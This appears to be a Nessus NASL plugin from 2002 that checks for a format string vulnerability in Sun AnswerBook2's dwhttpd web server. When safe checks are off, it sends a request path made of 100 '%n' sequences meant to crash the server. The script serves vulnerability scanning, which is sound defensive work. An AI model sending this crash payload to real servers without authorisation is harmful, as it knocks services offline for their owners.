#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#      This script could also cover BID:1556 and CVE-2000-0697
#
# GPL
# *untested*
#
# References:
#
# Date:  Thu, 1 Aug 2002 16:31:40 -0600 (MDT)		      
# From: "ghandi" <ghandi@mindless.com>			      
# To: bugtraq@securityfocus.com				      
# Subject: Sun AnswerBook2 format string and other vulnerabilities
#
# Affected:
# dwhttp/4.0.2a7a, dwhttpd/4.1a6
# And others?


if(description)
{
 script_id(11075);
 script_bugtraq_id(5384);
 script_version ("$Revision: 1.15 $");

 name["english"] = "dwhttpd format string";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server is vulnerable to a format string attack.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "DynaWeb server vulnerable to format string";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 8888);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");
include("misc_func.inc");

function check(port)
{
 banner = get_http_banner(port: port);
 if ( "dwhttp/" >!< banner ) return 0;

 if (safe_checks()) 
 {
	if (egrep(string: banner, pattern: "^Server: *dwhttp/4.(0|1[^0-9])"))
		security_warning(port);
	return(0);
 }

 if(http_is_dead(port: port)) { return(0); }

 soc = http_open_socket(port);
 if(! soc) return(0);

 i = string("/", crap(data:"%n", length: 100));
 r = http_get(item:i, port:port);

 send(socket:soc, data: r);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 if(http_is_dead(port: port, retry:2)) { security_hole(port); }
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8888);
foreach port (ports)
{
 check(port:port);
}
